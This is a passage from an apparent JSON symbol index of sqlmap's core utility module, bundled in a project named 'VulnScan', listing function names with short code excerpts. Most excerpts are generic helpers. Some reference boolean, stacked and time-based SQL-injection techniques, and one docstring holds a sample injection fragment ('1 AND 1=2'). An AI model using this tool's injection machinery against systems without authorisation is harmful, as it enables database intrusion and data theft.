        "peekOfCode": "def isInferenceAvailable():\n    \"\"\"\n    Returns True whether techniques using inference technique are available\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.BOOLEAN] = getSortedInjectionTests()[0]\n    >>> isInferenceAvailable()\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n    return any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.STACKED, PAYLOAD.TECHNIQUE.TIME))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "setOptimize",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def setOptimize():\n    \"\"\"\n    Sets options turned on by switch '-o'\n    \"\"\"\n    # conf.predictOutput = True\n    conf.keepAlive = True\n    conf.threads = 3 if conf.threads < 3 and cmdLineOptions.threads is None else conf.threads\n    conf.nullConnection = not any((conf.data, conf.textOnly, conf.titles, conf.string, conf.notString, conf.regexp, conf.tor))\n    if not conf.nullConnection:\n        debugMsg = \"turning off switch '--null-connection' used indirectly by switch '-o'\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "saveConfig",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def saveConfig(conf, filename):\n    \"\"\"\n    Saves conf to configuration filename\n    \"\"\"\n    config = UnicodeRawConfigParser()\n    userOpts = {}\n    for family in optDict:\n        userOpts[family] = []\n    for option, value in conf.items():\n        for family, optionData in optDict.items():",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "initTechnique",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def initTechnique(technique=None):\n    \"\"\"\n    Prepares data for technique specified\n    \"\"\"\n    try:\n        data = getTechniqueData(technique)\n        resetCounter(technique)\n        if data:\n            kb.pageTemplate, kb.errorIsNone = getPageTemplate(data.templatePayload, kb.injection.place)\n            kb.matchRatio = data.matchRatio",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "arrayizeValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def arrayizeValue(value):\n    \"\"\"\n    Makes a list out of value if it is not already a list or tuple itself\n    >>> arrayizeValue('1')\n    ['1']\n    \"\"\"\n    if isinstance(value, _collections.KeysView):\n        value = [_ for _ in value]\n    elif not isListLike(value):\n        value = [value]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def unArrayizeValue(value):\n    \"\"\"\n    Makes a value out of iterable if it is a list or tuple itself\n    >>> unArrayizeValue(['1'])\n    '1'\n    >>> unArrayizeValue('1')\n    '1'\n    >>> unArrayizeValue(['1', '2'])\n    '1'\n    >>> unArrayizeValue([['a', 'b'], 'c'])",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "flattenValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def flattenValue(value):\n    \"\"\"\n    Returns an iterator representing flat representation of a given value\n    >>> [_ for _ in flattenValue([['1'], [['2'], '3']])]\n    ['1', '2', '3']\n    \"\"\"\n    for i in iter(value):\n        if isListLike(i):\n            for j in flattenValue(i):\n                yield j",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "joinValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def joinValue(value, delimiter=','):\n    \"\"\"\n    Returns a value consisting of joined parts of a given value\n    >>> joinValue(['1', '2'])\n    '1,2'\n    >>> joinValue('1')\n    '1'\n    \"\"\"\n    if isListLike(value):\n        retVal = delimiter.join(value)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isListLike(value):\n    \"\"\"\n    Returns True if the given value is a list-like instance\n    >>> isListLike([1, 2, 3])\n    True\n    >>> isListLike('2')\n    False\n    \"\"\"\n    return isinstance(value, (list, tuple, set, OrderedSet, BigArray))\ndef getSortedInjectionTests():",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSortedInjectionTests",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getSortedInjectionTests():\n    \"\"\"\n    Returns prioritized test list by eventually detected DBMS from error messages\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.SQLITE\n    >>> [test for test in getSortedInjectionTests() if hasattr(test, \"details\") and hasattr(test.details, \"dbms\")][0].details.dbms == kb.forcedDbms\n    True\n    >>> kb.forcedDbms = popValue()\n    \"\"\"\n    retVal = copy.deepcopy(conf.tests)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterListValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def filterListValue(value, regex):\n    \"\"\"\n    Returns list with items that have parts satisfying given regular expression\n    >>> filterListValue(['users', 'admins', 'logs'], r'(users|admins)')\n    ['users', 'admins']\n    \"\"\"\n    if isinstance(value, list) and regex:\n        retVal = [_ for _ in value if re.search(regex, _, re.I)]\n    else:\n        retVal = value",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "showHttpErrorCodes",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def showHttpErrorCodes():\n    \"\"\"\n    Shows all HTTP error codes raised till now\n    \"\"\"\n    if kb.httpErrorCodes:\n        warnMsg = \"HTTP error codes detected during run:\\n\"\n        warnMsg += \", \".join(\"%d (%s) - %d times\" % (code, _http_client.responses[code] if code in _http_client.responses else '?', count) for code, count in kb.httpErrorCodes.items())\n        logger.warning(warnMsg)\n        if any((str(_).startswith('4') or str(_).startswith('5')) and _ != _http_client.INTERNAL_SERVER_ERROR and _ != kb.originalCode for _ in kb.httpErrorCodes):\n            msg = \"too many 4xx and/or 5xx HTTP error codes \"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def openFile(filename, mode='r', encoding=UNICODE_ENCODING, errors=\"reversible\", buffering=1):  # \"buffering=1\" means line buffered (Reference: http://stackoverflow.com/a/3168436)\n    \"\"\"\n    Returns file handle of a given filename\n    >>> \"openFile\" in openFile(__file__).read()\n    True\n    >>> b\"openFile\" in openFile(__file__, \"rb\", None).read()\n    True\n    \"\"\"\n    # Reference: https://stackoverflow.com/a/37462452\n    if 'b' in mode:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeIntToUnicode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def decodeIntToUnicode(value):\n    \"\"\"\n    Decodes inferenced integer value to an unicode character\n    >>> decodeIntToUnicode(35) == '#'\n    True\n    >>> decodeIntToUnicode(64) == '@'\n    True\n    \"\"\"\n    retVal = value\n    if isinstance(value, int):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkIntegrity",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def checkIntegrity():\n    \"\"\"\n    Checks integrity of code files during the unhandled exceptions\n    \"\"\"\n    if not paths:\n        return\n    logger.debug(\"running code integrity check\")\n    retVal = True\n    baseTime = os.path.getmtime(paths.SQLMAP_SETTINGS_PATH) + 3600  # First hour free parking :)\n    for root, _, filenames in os.walk(paths.SQLMAP_ROOT_PATH):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getDaysFromLastUpdate",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getDaysFromLastUpdate():\n    \"\"\"\n    Get total number of days from last update\n    >>> getDaysFromLastUpdate() >= 0\n    True\n    \"\"\"\n    if not paths:\n        return\n    return int(time.time() - os.path.getmtime(paths.SQLMAP_SETTINGS_PATH)) // (3600 * 24)\ndef unhandledExceptionMessage():",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "unhandledExceptionMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def unhandledExceptionMessage():\n    \"\"\"\n    Returns detailed message about occurred unhandled exception\n    >>> all(_ in unhandledExceptionMessage() for _ in (\"unhandled exception occurred\", \"Operating system\", \"Command line\"))\n    True\n    \"\"\"\n    errMsg = \"unhandled exception occurred in %s. It is recommended to retry your \" % VERSION_STRING\n    errMsg += \"run with the latest development version from official GitHub \"\n    errMsg += \"repository at '%s'. If the exception persists, please open a new issue \" % GIT_PAGE\n    errMsg += \"at '%s' \" % ISSUES_PAGE",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLatestRevision",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getLatestRevision():\n    \"\"\"\n    Retrieves latest revision from the offical repository\n    \"\"\"\n    retVal = None\n    req = _urllib.request.Request(url=\"https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/lib/core/settings.py\", headers={HTTP_HEADER.USER_AGENT: fetchRandomAgent()})\n    try:\n        content = getUnicode(_urllib.request.urlopen(req).read())\n        retVal = extractRegexResult(r\"VERSION\\s*=\\s*[\\\"'](?P<result>[\\d.]+)\", content)\n    except:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "fetchRandomAgent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def fetchRandomAgent():\n    \"\"\"\n    Returns random HTTP User-Agent header value\n    >>> '(' in fetchRandomAgent()\n    True\n    \"\"\"\n    if not kb.userAgents:\n        debugMsg = \"loading random HTTP User-Agent header(s) from \"\n        debugMsg += \"file '%s'\" % paths.USER_AGENTS\n        logger.debug(debugMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "createGithubIssue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def createGithubIssue(errMsg, excMsg):\n    \"\"\"\n    Automatically create a Github issue with unhandled exception information\n    \"\"\"\n    try:\n        issues = getFileItems(paths.GITHUB_HISTORY, unique=True)\n    except:\n        issues = []\n    finally:\n        issues = set(issues)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "maskSensitiveData",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def maskSensitiveData(msg):\n    \"\"\"\n    Masks sensitive data in the supplied message\n    >>> maskSensitiveData('python sqlmap.py -u \"http://www.test.com/vuln.php?id=1\" --banner') == 'python sqlmap.py -u *********************************** --banner'\n    True\n    >>> maskSensitiveData('sqlmap.py -u test.com/index.go?id=index --auth-type=basic --auth-creds=foo:bar\\\\ndummy line') == 'sqlmap.py -u ************************** --auth-type=***** --auth-creds=*******\\\\ndummy line'\n    True\n    \"\"\"\n    retVal = getUnicode(msg)\n    for item in filterNone(conf.get(_) for _ in SENSITIVE_OPTIONS):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "listToStrValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def listToStrValue(value):\n    \"\"\"\n    Flattens list to a string value\n    >>> listToStrValue([1,2,3])\n    '1, 2, 3'\n    \"\"\"\n    if isinstance(value, (set, tuple, types.GeneratorType)):\n        value = list(value)\n    if isinstance(value, list):\n        retVal = value.__str__().lstrip('[').rstrip(']')",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "intersect",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def intersect(containerA, containerB, lowerCase=False):\n    \"\"\"\n    Returns intersection of the container-ized values\n    >>> intersect([1, 2, 3], set([1,3]))\n    [1, 3]\n    \"\"\"\n    retVal = []\n    if containerA and containerB:\n        containerA = arrayizeValue(containerA)\n        containerB = arrayizeValue(containerB)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeStringEscape",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def decodeStringEscape(value):\n    \"\"\"\n    Decodes escaped string values (e.g. \"\\\\t\" -> \"\\t\")\n    \"\"\"\n    retVal = value\n    if value and '\\\\' in value:\n        charset = \"\\\\%s\" % string.whitespace.replace(\" \", \"\")\n        for _ in charset:\n            retVal = retVal.replace(repr(_).strip(\"'\"), _)\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "encodeStringEscape",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def encodeStringEscape(value):\n    \"\"\"\n    Encodes escaped string values (e.g. \"\\t\" -> \"\\\\t\")\n    \"\"\"\n    retVal = value\n    if value:\n        charset = \"\\\\%s\" % string.whitespace.replace(\" \", \"\")\n        for _ in charset:\n            retVal = retVal.replace(_, repr(_).strip(\"'\"))\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "removeReflectiveValues",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def removeReflectiveValues(content, payload, suppressWarning=False):\n    \"\"\"\n    Neutralizes reflective values in a given content based on a payload\n    (e.g. ..search.php?q=1 AND 1=2 --> \"...searching for <b>1%20AND%201%3D2</b>...\" --> \"...searching for <b>__REFLECTED_VALUE__</b>...\")\n    \"\"\"\n    retVal = content\n    try:\n        if all((content, payload)) and isinstance(content, six.text_type) and kb.reflectiveMechanism and not kb.heuristicMode:\n            def _(value):\n                while 2 * REFLECTED_REPLACEMENT_REGEX in value:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizeUnicode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def normalizeUnicode(value, charset=string.printable[:string.printable.find(' ') + 1]):\n    \"\"\"\n    Does an ASCII normalization of unicode strings\n    # Reference: http://www.peterbe.com/plog/unicode-to-ascii\n    >>> normalizeUnicode(u'\\\\u0161u\\\\u0107uraj') == u'sucuraj'\n    True\n    >>> normalizeUnicode(getUnicode(decodeHex(\"666f6f00626172\"))) == u'foobar'\n    True\n    \"\"\"\n    retVal = value",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def safeSQLIdentificatorNaming(name, isTable=False):\n    \"\"\"\n    Returns a safe representation of SQL identificator name (internal data format)\n    # Reference: http://stackoverflow.com/questions/954884/what-special-characters-are-allowed-in-t-sql-column-retVal\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.MSSQL\n    >>> getText(safeSQLIdentificatorNaming(\"begin\"))\n    '[begin]'\n    >>> getText(safeSQLIdentificatorNaming(\"foobar\"))\n    'foobar'",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def unsafeSQLIdentificatorNaming(name):\n    \"\"\"\n    Extracts identificator's name from its safe SQL representation\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.MSSQL\n    >>> getText(unsafeSQLIdentificatorNaming(\"[begin]\"))\n    'begin'\n    >>> getText(unsafeSQLIdentificatorNaming(\"foobar\"))\n    'foobar'\n    >>> kb.forceDbms = popValue()",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isNoneValue(value):\n    \"\"\"\n    Returns whether the value is unusable (None or '')\n    >>> isNoneValue(None)\n    True\n    >>> isNoneValue('None')\n    True\n    >>> isNoneValue('')\n    True\n    >>> isNoneValue([])",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNullValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isNullValue(value):\n    \"\"\"\n    Returns whether the value contains explicit 'NULL' value\n    >>> isNullValue(u'NULL')\n    True\n    >>> isNullValue(u'foobar')\n    False\n    \"\"\"\n    return hasattr(value, \"upper\") and value.upper() == NULL\ndef expandMnemonics(mnemonics, parser, args):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "expandMnemonics",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def expandMnemonics(mnemonics, parser, args):\n    \"\"\"\n    Expands mnemonic options\n    \"\"\"\n    class MnemonicNode(object):\n        def __init__(self):\n            self.next = {}\n            self.current = []\n    head = MnemonicNode()\n    pointer = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeCSValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def safeCSValue(value):\n    \"\"\"\n    Returns value safe for CSV dumping\n    # Reference: http://tools.ietf.org/html/rfc4180\n    >>> safeCSValue('foo, bar')\n    '\"foo, bar\"'\n    >>> safeCSValue('foobar')\n    'foobar'\n    \"\"\"\n    retVal = value",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterPairValues",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def filterPairValues(values):\n    \"\"\"\n    Returns only list-like values with length 2\n    >>> filterPairValues([[1, 2], [3], 1, [4, 5]])\n    [[1, 2], [4, 5]]\n    \"\"\"\n    retVal = []\n    if not isNoneValue(values) and hasattr(values, '__iter__'):\n        retVal = [value for value in values if isinstance(value, (tuple, list, set)) and len(value) == 2]\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomizeParameterValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def randomizeParameterValue(value):\n    \"\"\"\n    Randomize a parameter value based on occurrences of alphanumeric characters\n    >>> random.seed(0)\n    >>> randomizeParameterValue('foobar')\n    'fupgpy'\n    >>> randomizeParameterValue('17')\n    '36'\n    \"\"\"\n    retVal = value",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "asciifyUrl",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def asciifyUrl(url, forceQuote=False):\n    \"\"\"\n    Attempts to make a unicode URL usable with ``urllib/urllib2``.\n    More specifically, it attempts to convert the unicode object ``url``,\n    which is meant to represent a IRI, to an unicode object that,\n    containing only ASCII characters, is a valid URI. This involves:\n        * IDNA/Puny-encoding the domain name.\n        * UTF8-quoting the path and querystring parts.\n    See also RFC 3987.\n    # Reference: http://blog.elsdoerfer.name/2008/12/12/opening-iris-in-python/",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isAdminFromPrivileges",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isAdminFromPrivileges(privileges):\n    \"\"\"\n    Inspects privileges to see if those are coming from an admin user\n    \"\"\"\n    privileges = privileges or []\n    # In PostgreSQL the usesuper privilege means that the\n    # user is DBA\n    retVal = (Backend.isDbms(DBMS.PGSQL) and \"super\" in privileges)\n    # In Oracle the DBA privilege means that the\n    # user is DBA",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "findPageForms",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def findPageForms(content, url, raise_=False, addToTargets=False):\n    \"\"\"\n    Parses given page content for possible forms (Note: still not implemented for Python3)\n    >>> findPageForms('<html><form action=\"/input.php\" method=\"POST\"><input type=\"text\" name=\"id\" value=\"1\"><input type=\"submit\" value=\"Submit\"></form></html>', 'http://www.site.com') == set([('http://www.site.com/input.php', 'POST', 'id=1', None, None)])\n    True\n    \"\"\"\n    class _(six.StringIO, object):\n        def __init__(self, content, url):\n            super(_, self).__init__(content)\n            self._url = url",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkSameHost",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def checkSameHost(*urls):\n    \"\"\"\n    Returns True if all provided urls share that same host\n    >>> checkSameHost('http://www.target.com/page1.php?id=1', 'http://www.target.com/images/page2.php')\n    True\n    >>> checkSameHost('http://www.target.com/page1.php?id=1', 'http://www.target2.com/images/page2.php')\n    False\n    \"\"\"\n    if not urls:\n        return None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getHostHeader",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getHostHeader(url):\n    \"\"\"\n    Returns proper Host header value for a given target URL\n    >>> getHostHeader('http://www.target.com/vuln.php?id=1')\n    'www.target.com'\n    \"\"\"\n    retVal = url\n    if url:\n        retVal = _urllib.parse.urlparse(url).netloc\n        if re.search(r\"http(s)?://\\[.+\\]\", url, re.I):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkOldOptions",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def checkOldOptions(args):\n    \"\"\"\n    Checks for obsolete/deprecated options\n    \"\"\"\n    for _ in args:\n        _ = _.split('=')[0].strip()\n        if _ in OBSOLETE_OPTIONS:\n            errMsg = \"switch/option '%s' is obsolete\" % _\n            if OBSOLETE_OPTIONS[_]:\n                errMsg += \" (hint: %s)\" % OBSOLETE_OPTIONS[_]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkSystemEncoding",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def checkSystemEncoding():\n    \"\"\"\n    Checks for problematic encodings\n    \"\"\"\n    if sys.getdefaultencoding() == \"cp720\":\n        try:\n            codecs.lookup(\"cp720\")\n        except LookupError:\n            errMsg = \"there is a known Python issue (#1616979) related \"\n            errMsg += \"to support for charset 'cp720'. Please visit \"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "evaluateCode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def evaluateCode(code, variables=None):\n    \"\"\"\n    Executes given python code given in a string form\n    >>> _ = {}; evaluateCode(\"a = 1; b = 2; c = a\", _); _[\"c\"]\n    1\n    \"\"\"\n    try:\n        exec(code, variables)\n    except KeyboardInterrupt:\n        raise",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "serializeObject",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def serializeObject(object_):\n    \"\"\"\n    Serializes given object\n    >>> type(serializeObject([1, 2, 3, ('a', 'b')])) == str\n    True\n    \"\"\"\n    return base64pickle(object_)\ndef unserializeObject(value):\n    \"\"\"\n    Unserializes object from given serialized form",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "unserializeObject",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def unserializeObject(value):\n    \"\"\"\n    Unserializes object from given serialized form\n    >>> unserializeObject(serializeObject([1, 2, 3])) == [1, 2, 3]\n    True\n    >>> unserializeObject('gAJVBmZvb2JhcnEBLg==')\n    'foobar'\n    \"\"\"\n    return base64unpickle(value) if value else None\ndef resetCounter(technique):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "resetCounter",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def resetCounter(technique):\n    \"\"\"\n    Resets query counter for a given technique\n    \"\"\"\n    kb.counters[technique] = 0\ndef incrementCounter(technique):\n    \"\"\"\n    Increments query counter for a given technique\n    \"\"\"\n    kb.counters[technique] = getCounter(technique) + 1",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "incrementCounter",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def incrementCounter(technique):\n    \"\"\"\n    Increments query counter for a given technique\n    \"\"\"\n    kb.counters[technique] = getCounter(technique) + 1\ndef getCounter(technique):\n    \"\"\"\n    Returns query counter for a given technique\n    >>> resetCounter(PAYLOAD.TECHNIQUE.STACKED); incrementCounter(PAYLOAD.TECHNIQUE.STACKED); getCounter(PAYLOAD.TECHNIQUE.STACKED)\n    1",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getCounter",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getCounter(technique):\n    \"\"\"\n    Returns query counter for a given technique\n    >>> resetCounter(PAYLOAD.TECHNIQUE.STACKED); incrementCounter(PAYLOAD.TECHNIQUE.STACKED); getCounter(PAYLOAD.TECHNIQUE.STACKED)\n    1\n    \"\"\"\n    return kb.counters.get(technique, 0)\ndef applyFunctionRecursively(value, function):\n    \"\"\"\n    Applies function recursively through list-like structures",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "applyFunctionRecursively",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
